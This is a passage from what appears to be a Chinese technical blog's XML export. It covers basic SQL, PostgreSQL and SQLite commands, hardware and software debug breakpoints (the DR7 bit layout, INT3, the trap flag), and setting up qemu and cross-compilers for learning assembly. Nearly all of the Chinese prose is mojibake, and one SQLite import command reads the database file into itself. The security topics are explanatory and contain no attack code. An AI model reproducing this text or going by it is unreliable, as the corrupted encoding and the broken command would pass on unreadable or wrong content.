å¢åŠ </span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>æ•°æ®ç±»å‹</p>
<p>æŸ¥è¯¢é™å®š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- æ’åº</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å±æ€§é™å®š</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ç»“æœä¸ªæ•°</span></span><br><span class="line">limit</span><br></pre></td></tr></table></figure>

<h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><p>æ•°æ®åº“</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥çœ‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- è¿æ¥</span></span><br></pre></td></tr></table></figure>

<p>è¡¨</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">	column_name data_type å±æ€§ </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥è¯¢</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å¢åŠ </span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- æ’åº</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å»é‡</span></span><br><span class="line"><span class="keyword">distinct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å±æ€§é™å®š</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br></pre></td></tr></table></figure>

<h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><p>sqlite3</p>
<p>å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.help;     -- å¸®åŠ©ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">.open test.db;  -- æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰å°±åˆ›å»º</span><br><span class="line"></span><br><span class="line">.show;     -- æ˜¾ç¤ºä¸€ç³»åˆ—å±æ€§</span><br><span class="line"></span><br><span class="line">.quit   -- é€€å‡º</span><br><span class="line"></span><br><span class="line">.databases  -- æ˜¾ç¤ºæ•°æ®åº“</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºæ•°æ®åº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- è¯»å–æˆ–è€…åˆ›å»º</span><br><span class="line">sqlite3 name</span><br><span class="line">.open name</span><br></pre></td></tr></table></figure>

<p>å¯¼å…¥å¯¼å‡ºæ•°æ®åº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.dump   -- å°†æ•°æ®åº“å¯¼å‡ºSQL æ–‡ä»¶ </span><br><span class="line">sqlite3 test.db .dump &gt; test.sql</span><br><span class="line">sqlite3 test.db &lt; test.db</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºè¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.tables  -- æ˜¾ç¤ºè¡¨</span><br><span class="line">.schema  -- è¡¨çš„ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">CREATE TABLE table_name (</span><br><span class="line">	column_name type primary key</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DROP TABLE database.table_name;</span><br><span class="line"></span><br><span class="line">INSERT INTO table_name(&quot;cloumn_name&quot;) values (&quot;value&quot;)</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- è¿˜æ˜¯SELECT è¯­å¥</span><br></pre></td></tr></table></figure>

<h1 id="ç¼–ç¨‹æ“ä½œ"><a href="#ç¼–ç¨‹æ“ä½œ" class="headerlink" title="ç¼–ç¨‹æ“ä½œ"></a>ç¼–ç¨‹æ“ä½œ</h1><p>ä½¿ç”¨Cè¯­è¨€æ“ä½œæ•°æ®åº“ï¼Œå…¶ä½™ç¼–ç¨‹è¯­è¨€æ“ä½œæ•°æ®åº“ä¹Ÿå·®ä¸å¤šï¼Œä¸»è¦æ˜¯å†™SQLè¯­å¥çš„æ“ä½œã€‚</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¨‹åºæ–­ç‚¹</title>
    <url>/2024/03/31/%E6%96%AD%E7%82%B9/</url>
    <content><![CDATA[<blockquote>
<p>debug break point</p>
</blockquote>
<span id="more"></span>

<h2 id="æ–­ç‚¹"><a href="#æ–­ç‚¹" class="headerlink" title="æ–­ç‚¹"></a>æ–­ç‚¹</h2><h3 id="ç¡¬æ–­ç‚¹"><a href="#ç¡¬æ–­ç‚¹" class="headerlink" title="ç¡¬æ–­ç‚¹"></a>ç¡¬æ–­ç‚¹</h3><p>Debug Register</p>
<p>ç¡¬ä»¶æ–­ç‚¹æ˜¯é€šè¿‡ä½äº CPU ä¸Šçš„ä¸€ç»„ç‰¹æ®Šå¯„å­˜å™¨æ¥å®ç°çš„ï¼Œç§°ä¸ºè°ƒè¯•å¯„å­˜å™¨ã€‚æ¯”å¦‚ x86 æ¶æ„çš„ CPU ä¸Šæœ‰ 8 ä¸ªè°ƒè¯•å¯„å­˜å™¨ï¼ˆDR0-DR7ï¼‰ï¼Œåˆ†åˆ«ç”¨äºè®¾ç½®å’Œç®¡ç†ç¡¬ä»¶æ–­ç‚¹ã€‚</p>
<ul>
<li>DR0-DR3 è´Ÿè´£å­˜å‚¨ç¡¬ä»¶æ–­ç‚¹çš„<em>Linear Address</em>ã€‚æ‰€ä»¥æœ€å¤šåªèƒ½åŒæ—¶ä½¿ç”¨ 4 ä¸ªç¡¬ä»¶æ–­ç‚¹ã€‚</li>
<li>DR4 å’Œ DR5 ä¿ç•™ä½¿ç”¨ã€‚</li>
<li>DR6 ä¸ºè°ƒè¯•çŠ¶æ€å¯„å­˜å™¨ï¼Œä¿å­˜è°ƒè¯•å¼‚å¸¸äº§ç”Ÿåæ˜¾ç¤ºçš„ä¸€äº›ä¿¡æ¯</li>
<li>DR7 æ˜¯ç¡¬ä»¶æ–­ç‚¹çš„æ¿€æ´»å¼€å…³ï¼Œå­˜å‚¨ç€å„ä¸ªæ–­ç‚¹çš„è§¦å‘ä¿¡æ¯æ¡ä»¶ã€‚ ä¸è½¯æ–­ç‚¹ä¸åŒçš„æ˜¯ï¼Œç¡¬ä»¶æ–­ç‚¹ä½¿ç”¨ 1 å·ä¸­æ–­ï¼ˆINT1ï¼‰å®ç°ï¼ŒINT1 ä¸€èˆ¬è¢«ç”¨äºç¡¬ä»¶æ–­ç‚¹å’Œå•æ­¥äº‹ä»¶ã€‚</li>
</ul>
<p><a href="https://bbs.kanxue.com/thread-248728.htm">ç¡¬ä»¶æ–­ç‚¹å’ŒåŸç†ä¸å®ç°</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DBG_REG7</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    // å±€éƒ¨æ–­ç‚¹(L0~3)ä¸å…¨å±€æ–­ç‚¹(G0~3)çš„æ ‡è®°ä½</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">unsigned</span> L0 : <span class="number">1</span>;  <span class="comment">// å¯¹Dr0ä¿å­˜çš„åœ°å€å¯ç”¨ å±€éƒ¨æ–­ç‚¹</span></span><br><span class="line">    <span class="type">unsigned</span> G0 : <span class="number">1</span>;  <span class="comment">// å¯¹Dr0ä¿å­˜çš„åœ°å€å¯ç”¨ å…¨å±€æ–­ç‚¹</span></span><br><span class="line">    <span class="type">unsigned</span> L1 : <span class="number">1</span>;  <span class="comment">// å¯¹Dr1ä¿å­˜çš„åœ°å€å¯ç”¨ å±€éƒ¨æ–­ç‚¹</span></span><br><span class="line">    <span class="type">unsigned</span> G1 : <span class="number">1</span>;  <span class="comment">// å¯¹Dr1ä¿å­˜çš„åœ°å€å¯ç”¨ å…¨å±€æ–­ç‚¹</span></span><br><span class="line">    <span class="type">unsigned</span> L2 : <span class="number">1</span>;  <span class="comment">// å¯¹Dr2ä¿å­˜çš„åœ°å€å¯ç”¨ å±€éƒ¨æ–­ç‚¹</span></span><br><span class="line">    <span class="type">unsigned</span> G2 : <span class="number">1</span>;  <span class="comment">// å¯¹Dr2ä¿å­˜çš„åœ°å€å¯ç”¨ å…¨å±€æ–­ç‚¹</span></span><br><span class="line">    <span class="type">unsigned</span> L3 : <span class="number">1</span>;  <span class="comment">// å¯¹Dr3ä¿å­˜çš„åœ°å€å¯ç”¨ å±€éƒ¨æ–­ç‚¹</span></span><br><span class="line">    <span class="type">unsigned</span> G3 : <span class="number">1</span>;  <span class="comment">// å¯¹Dr3ä¿å­˜çš„åœ°å€å¯ç”¨ å…¨å±€æ–­ç‚¹</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> LE : <span class="number">1</span>;   <span class="comment">// local exception</span></span><br><span class="line">    <span class="type">unsigned</span> GE : <span class="number">1</span>;   <span class="comment">// global exception</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿ç•™å­—æ®µ</span></span><br><span class="line">    <span class="type">unsigned</span> Reserve1 : <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿æŠ¤è°ƒè¯•å¯„å­˜å™¨æ ‡å¿—ä½ï¼Œå¦‚æœæ­¤ä½ä¸º1ï¼Œåˆ™æœ‰æŒ‡ä»¤ä¿®æ”¹æ¡æ˜¯å¯„å­˜å™¨æ—¶ä¼šè§¦å‘å¼‚å¸¸</span></span><br><span class="line">    <span class="type">unsigned</span> GD : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿ç•™å­—æ®µ</span></span><br><span class="line">    <span class="type">unsigned</span> Reserve2 : <span class="number">2</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> RW0 : <span class="number">2</span>;   <span class="comment">// è®¾å®šDr0æŒ‡å‘åœ°å€çš„æ–­ç‚¹ç±»å‹</span></span><br><span class="line">    <span class="type">unsigned</span> LEN0 : <span class="number">2</span>;  <span class="comment">// è®¾å®šDr0æŒ‡å‘åœ°å€çš„æ–­ç‚¹é•¿åº¦</span></span><br><span class="line">    <span class="type">unsigned</span> RW1 : <span class="number">2</span>;   <span class="comment">// è®¾å®šDr1æŒ‡å‘åœ°å€çš„æ–­ç‚¹ç±»å‹</span></span><br><span class="line">    <span class="type">unsigned</span> LEN1 : <span class="number">2</span>;  <span class="comment">// è®¾å®šDr1æŒ‡å‘åœ°å€çš„æ–­ç‚¹é•¿åº¦</span></span><br><span class="line">    <span class="type">unsigned</span> RW2 : <span class="number">2</span>;   <span class="comment">// è®¾å®šDr2æŒ‡å‘åœ°å€çš„æ–­ç‚¹ç±»å‹</span></span><br><span class="line">    <span class="type">unsigned</span> LEN2 : <span class="number">2</span>;  <span class="comment">// è®¾å®šDr2æŒ‡å‘åœ°å€çš„æ–­ç‚¹é•¿åº¦</span></span><br><span class="line">    <span class="type">unsigned</span> RW3 : <span class="number">2</span>;   <span class="comment">// è®¾å®šDr3æŒ‡å‘åœ°å€çš„æ–­ç‚¹ç±»å‹</span></span><br><span class="line">    <span class="type">unsigned</span> LEN3 : <span class="number">2</span>;  <span class="comment">// è®¾å®šDr3æŒ‡å‘åœ°å€çš„æ–­ç‚¹é•¿åº¦</span></span><br><span class="line">&#125;DBG_REG7, *PDBG_REG7;</span><br></pre></td></tr></table></figure>

<p>ä¿å­˜DR0-DR3åœ°å€æ‰€æŒ‡å‘ä½ç½®çš„æ–­ç‚¹ç±»å‹(RW0-RW3)ä¸æ–­ç‚¹é•¿åº¦(LEN0-LEN3)ï¼ŒçŠ¶æ€æè¿°å¦‚ä¸‹ï¼š  </p>
<ul>
<li>RW: 00ï¼šæ‰§è¡Œ 01ï¼šå†™å…¥ 11ï¼šè¯»å†™  </li>
<li>LEN: 00ï¼š1å­—èŠ‚ 01ï¼š2å­—èŠ‚ 11ï¼š4å­—èŠ‚</li>
</ul>
<p>è®¾ç½®<strong>ç¡¬ä»¶æ‰§è¡Œæ–­ç‚¹</strong>æ—¶ï¼Œé•¿åº¦åªèƒ½ä¸º1(LEN0-LEN3è®¾ç½®ä¸º0æ—¶è¡¨ç¤ºé•¿åº¦ä¸º1)</p>
<p>è®¾ç½®<strong>è¯»å†™æ–­ç‚¹</strong>æ—¶ï¼Œå¦‚æœé•¿åº¦ä¸º1ï¼Œåœ°å€ä¸éœ€è¦å¯¹é½ï¼Œå¦‚æœé•¿åº¦ä¸º2ï¼Œåˆ™åœ°å€å¿…é¡»æ˜¯2çš„æ•´æ•°å€ï¼Œå¦‚æœé•¿åº¦ä¸º4ï¼Œåˆ™åœ°å€å¿…é¡»æ˜¯4çš„æ•´æ•°å€ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬æƒ³å¼€å¯ä¸€ä¸ªç¡¬æ–­ç‚¹</p>
<p>DBG_REG7</p>
<ul>
<li>L0 &#x3D; 0b1</li>
<li>LE &#x3D; 0b1 åœ¨å±€éƒ¨exceptionè§¦å‘æ–­ç‚¹</li>
<li>RW0 &#x3D; 0b11</li>
<li>LEN0 &#x3D; 0b11</li>
</ul>
<p>å¯ä»¥åšä¸€ä¸‹CTFé¢˜ç›®ï¼š<a href="https://blingblingxuanxuan.github.io/2023/07/05/230705-sctf2023-kernel-pwn-sycrop/">SCTF 2023 Kernel Pwn Sycrop</a></p>
<h3 id="è½¯æ–­ç‚¹"><a href="#è½¯æ–­ç‚¹" class="headerlink" title="è½¯æ–­ç‚¹"></a>è½¯æ–­ç‚¹</h3><p>éœ€è¦ä¸­æ–­æŒ‡ä»¤ INT3ã€‚</p>
<p>å½“æˆ‘ä»¬åœ¨è°ƒè¯•å™¨ä¸­å¯¹ä»£ç çš„æŸä¸€è¡Œè®¾ç½®æ–­ç‚¹æ—¶ï¼Œè°ƒè¯•å™¨ä¼šå…ˆæŠŠè¿™é‡Œçš„æœ¬æ¥æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¿å­˜èµ·æ¥ï¼Œç„¶åå†™å…¥ä¸€æ¡ INT 3 æŒ‡ä»¤ã€‚å› ä¸º INT 3 æŒ‡ä»¤çš„æœºå™¨ç ä¸º 11001100bï¼ˆ0xCCï¼‰ï¼Œä»…æœ‰ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è®¾ç½®å’Œå–æ¶ˆæ–­ç‚¹æ—¶ä¹Ÿåªéœ€è¦ä¿å­˜å’Œæ¢å¤ä¸€ä¸ªå­—èŠ‚ï¼Œè¿™æ˜¯è®¾è®¡è¿™æ¡æŒ‡ä»¤æ—¶é¡»è€ƒè™‘å¥½çš„ã€‚</p>
<p>å½“ CPU æ‰§è¡Œåˆ° INT 3 æŒ‡ä»¤æ—¶ï¼Œç”±äº INT 3 æŒ‡ä»¤çš„è®¾è®¡ç›®çš„å°±æ˜¯ä¸­æ–­åˆ°è°ƒè¯•å™¨ï¼Œå› æ­¤ï¼ŒCPU æ‰§è¡Œè¿™æ¡æŒ‡ä»¤çš„è¿‡ç¨‹ä¹Ÿå°±æ˜¯äº§ç”Ÿæ–­ç‚¹å¼‚å¸¸ï¼ˆbreakpoint exceptionï¼Œç®€ç§°#BPï¼‰å¹¶ä¼šä¿å­˜å½“å‰çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œè½¬å»æ‰§è¡Œå¼‚å¸¸å¤„ç†ä¾‹ç¨‹çš„è¿‡ç¨‹ã€‚</p>
<p>åœ¨è°ƒè¯•å™¨ä¸‹ï¼Œæˆ‘ä»¬æ˜¯çœ‹ä¸åˆ°åŠ¨æ€æ›¿æ¢åˆ°ç¨‹åºä¸­çš„ INT 3 æŒ‡ä»¤çš„ã€‚å¤§å¤šæ•°è°ƒè¯•å™¨çš„åšæ³•æ˜¯åœ¨è¢«è°ƒè¯•ç¨‹åºä¸­æ–­åˆ°è°ƒè¯•å™¨æ—¶ï¼Œä¼šå…ˆå°†æ‰€æœ‰æ–­ç‚¹ä½ç½®è¢«æ›¿æ¢ä¸ºINT 3 çš„æŒ‡ä»¤æ¢å¤æˆåŸæ¥çš„æŒ‡ä»¤ï¼Œç„¶åå†æŠŠæ§åˆ¶æƒäº¤ç»™ç”¨æˆ·ã€‚</p>
<p>å½“ç”¨æˆ·ç»“æŸåˆ†æå¸Œæœ›æ¢å¤è¢«è°ƒè¯•ç¨‹åºæ‰§è¡Œæ—¶ï¼Œè°ƒè¯•å™¨é€šè¿‡è°ƒè¯• API é€šçŸ¥è°ƒè¯•å­ç³»ç»Ÿï¼Œè¿™ä¼šå¯¼è‡´ç³»ç»Ÿå†…æ ¸çš„å¼‚å¸¸åˆ†å‘å‡½æ•°è¿”å›åˆ°å¼‚å¸¸å¤„ç†ä¾‹ç¨‹ï¼Œç„¶åå¼‚å¸¸å¤„ç†ä¾‹ç¨‹é€šè¿‡IRET&#x2F;IRETD æŒ‡ä»¤è§¦å‘ä¸€ä¸ªå¼‚å¸¸è¿”å›åŠ¨ä½œï¼Œä½¿ CPU æ¢å¤æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œä»å‘ç”Ÿå¼‚å¸¸çš„ä½ç½®ç»§ç»­æ‰§è¡Œã€‚</p>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>x86å¤„ç†å™¨å¼•å…¥çš„PSWå¯„å­˜å™¨ï¼Œæœ‰ä¸€ä¸ªé™·é˜±æ ‡å¿—ä½ï¼Œåä¸ºTrap Flagï¼Œç®€ç§°TFã€‚  </p>
<p>å½“TFä¸º1æ—¶ï¼ŒCPUæ¯æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ä¾¿ä¼šäº§ç”Ÿä¸€ä¸ªè°ƒè¯•å¼‚å¸¸ï¼Œä¸­æ–­åˆ°è°ƒè¯•å¼‚å¸¸å¤„ç†ç¨‹åºã€‚  </p>
<p>è°ƒè¯•å™¨çš„å•æ­¥æ‰§è¡ŒåŠŸèƒ½å¤§å¤šæ˜¯ä¾é è¿™ä¸€æœºåˆ¶æ¥å®ç°çš„ã€‚</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>æ±‡ç¼–å­¦ä¹ </title>
    <url>/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p>åŸºæœ¬çš„æ±‡ç¼–å­¦ä¹ ã€‚</p>
</blockquote>
<span id="more"></span>

<p>å­¦ä¹ ç›®æ ‡ï¼šé¦–å…ˆèƒ½çœ‹æ‡‚ã€‚ç„¶åå°è¯•ç¼–å†™ <code>shellcode</code>ã€‚</p>
<p>ä¸ªäººä¹ æƒ¯å°å†™æŒ‡ä»¤ã€‚</p>
<ul>
<li><code>little-endian</code></li>
</ul>
<p>å¸¸è§çš„æ±‡ç¼–æ ¼å¼</p>
<ul>
<li>Intelæ ¼å¼ã€‚</li>
<li>AT&amp;Tï¼Œå®é™…ä½¿ç”¨ä¹Ÿå¾ˆå¸¸è§(Linuxä¸­é»˜è®¤çš„æ ¼å¼)</li>
</ul>
<p>éƒ¨åˆ†åè¯</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ISA: Instruction Set Architecture, æŒ‡ä»¤é›†æ¶æ„</span><br><span class="line">RISC: Reduced Instruction Set Computer, ç²¾ç®€æŒ‡ä»¤é›†è®¡ç®—æœº</span><br><span class="line">CISC: Complex Instruction Set Computer, å¤æ‚æŒ‡ä»¤é›†è®¡ç®—æœº</span><br><span class="line">ABI: application binary interface</span><br></pre></td></tr></table></figure>

<h2 id="ç¯å¢ƒé—®é¢˜"><a href="#ç¯å¢ƒé—®é¢˜" class="headerlink" title="ç¯å¢ƒé—®é¢˜"></a>ç¯å¢ƒé—®é¢˜</h2><p>æœ¬æœº linux: ubuntu &amp;&amp; kali virtual machineï¼›CPU: AMDã€‚</p>
<ul>
<li>æ— æ³•ç›´æ¥è¿è¡Œ <code>arm</code> å’Œ <code>mips</code> æ¶æ„çš„ç¨‹åº</li>
<li>armå¯ä»¥ä½¿ç”¨æ‰‹æœºç»ˆç«¯ <a href="https://termux.dev/en/">Termux</a> è¿›è¡Œè¿è¡Œã€‚æˆ–è€…è´­ä¹°äº‘æœåŠ¡å™¨?</li>
</ul>
<h3 id="ç¯å¢ƒå®‰è£…"><a href="#ç¯å¢ƒå®‰è£…" class="headerlink" title="ç¯å¢ƒå®‰è£…"></a>ç¯å¢ƒå®‰è£…</h3><p>åŸºæœ¬ç¯å¢ƒ <code>user mode+kernel mode</code>ã€‚ </p>
<ul>
<li>è¿è¡Œç¨‹åºåªéœ€è¦ä¸€ä¸ª<code>qemu-user</code> å°±è¡Œï¼Œå¯åŠ¨ç³»ç»Ÿéœ€è¦ <code>qemu-system-xxx</code></li>
<li>ç”šè‡³å¯ä»¥ <code>qemu-system</code> è·‘kernelï¼Œç„¶åè·‘ç¨‹åºğŸ˜‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># qemu userç”¨æˆ·æ€ systemå¯åŠ¨å†…æ ¸é•œåƒ</span></span><br><span class="line">sudo apt install qemu-user</span><br></pre></td></tr></table></figure>

<p>arm ç¯å¢ƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gun ç¼–è¯‘å·¥å…·é“¾ + åŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line">sudo apt list gcc* | grep arm</span><br><span class="line">sudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu arm system mode</span></span><br><span class="line">sudo apt list  <span class="string">&quot;qemu*&quot;</span> <span class="comment"># å¯»æ‰¾å¯¹ç”¨çš„arch</span></span><br><span class="line">sudo apt install qemu-system-arm qemu-system-aarch64</span><br></pre></td></tr></table></figure>

<p>mips ç¯å¢ƒ.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gun ç¼–è¯‘å·¥å…·é“¾</span></span><br><span class="line">sudo apt install gcc-mips-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu mips system mode, ç›®å‰æ²¡è§è¿‡ï¼Œ user mode åº”è¯¥å¤Ÿäº†</span></span><br><span class="line">sudo apt install qemu-system-mips</span><br></pre></td></tr></table></figure>

<p>gdb</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb gdb-multiarch</span><br></pre></td></tr></table></figure>

<h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><p>qemu-user ä½¿ç”¨ <code>-g</code> gdbæ¨¡å¼ ç¡®å®šgdbè°ƒè¯•ç«¯å£</p>
<p>qemu-system ä½¿ç”¨ <code>-s -S  æˆ–è€… -gdb tcp:1234</code> gdbserverç­‰å¾…è¿æ¥ï¼Œé»˜è®¤ç«¯å£ <code>1234</code></p>
<p>ç¼–ç¨‹æµ‹è¯•</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hello, world!&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯»æ‰¾åŠ¨æ€é“¾æ¥åº“ã€‚<code>lib-&gt;/usr/lib</code> çš„é“¾æ¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /usr/lib | grep arm  <span class="comment"># aarch64 mips...</span></span><br></pre></td></tr></table></figure>

<p>arm æµ‹è¯•ï¼Œä¸çŸ¥ä¸ºä»€ä¹ˆï¼Œæµ‹è¯•æ—¶ <code>-g</code>æ”¾å‰é¢æ‰æˆåŠŸ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç¼–è¯‘</span></span><br><span class="line">arm-linux-gnueabi-gcc hello.c -o helloarm -g</span><br><span class="line">aarch64-linux-gnu-gcc hello.c -o helloaarch -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œ</span></span><br><span class="line">$ qemu-arm -L /usr/arm-linux-gnueabi ./helloarm</span><br><span class="line">$ qemu-aarch64</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒè¯•</span></span><br><span class="line">$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./helloarm </span><br><span class="line">$ gdb-multiarch</span><br><span class="line">gdb&gt; <span class="built_in">set</span> <span class="built_in">arch</span> arm <span class="comment"># aarch64</span></span><br><span class="line">gdb&gt; target remote localhost:1234</span><br><span class="line">xxx </span><br></pre></td></tr></table></figure>

<p>mips æµ‹è¯•, ä¸armç±»ä¼¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc hello.c -o hellomips -g</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>CISC</p>
<h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><p>intel x86 é€šç”¨å¯„å­˜å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; é€šç”¨</span><br><span class="line">eax: ç´¯åŠ å™¨</span><br><span class="line">ebx: ä¸€èˆ¬åŸºå€å¯„å­˜å™¨ï¼Œbase</span><br><span class="line">ecx: counter, åœ¨loopæ—¶ï¼Œé»˜è®¤è®¡æ•°</span><br><span class="line">edx: ä¸€èˆ¬ç”¨äºå­˜æ”¾data</span><br><span class="line"></span><br><span class="line">esi: source index, å¤„ç†å­—ç¬¦ä¸²å¸¸ç”¨</span><br><span class="line">edi: destinatin index, å¤„ç†å­—ç¬¦ä¸²å¸¸ç”¨</span><br><span class="line"></span><br><span class="line">esp: stack pointer, æ ˆé¡¶</span><br><span class="line">ebp: base pointer, æ ˆåŸºå€</span><br><span class="line"></span><br><span class="line">eip: æŒ‡å‘å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</span><br></pre></td></tr></table></figure>

<p>æ ‡å¿—ä½ <code>eflags</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CF: carry flag, è¿›ä½</span><br><span class="line">ZF: zero, 0</span><br><span class="line">SF: sign, ç¬¦å·</span><br><span class="line">OF: overflow, æº¢å‡º</span><br><span class="line">TF: trap, è·Ÿè¸ª</span><br><span class="line">IF: interrupt, ä¸­æ–­</span><br><span class="line">PF: parity, å¥‡å¶</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>æ®µå¯„å­˜å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cs: code segment ä»£ç æ®µ</span><br><span class="line">ds: data æ•°æ®æ®µ</span><br><span class="line">ss: stack å †æ ˆæ®µ</span><br><span class="line">es: extend æ‰©å±•æ®µ</span><br><span class="line">fs: æ•°æ®æ®µ</span><br><span class="line">gs: æ•°æ®æ®µ</span><br></pre></td></tr></table></figure>

<p>æ§åˆ¶å¯„å­˜å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; æŸäº›ä¿æŠ¤æ¨¡å¼</span><br><span class="line">cr0-cr4</span><br></pre></td></tr></table></figure>

<p>å¯»å€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov</span><br><span class="line">lea</span><br></pre></td></tr></table></figure>

<p>ç®—æœ¯æŒ‡ä»¤</p>
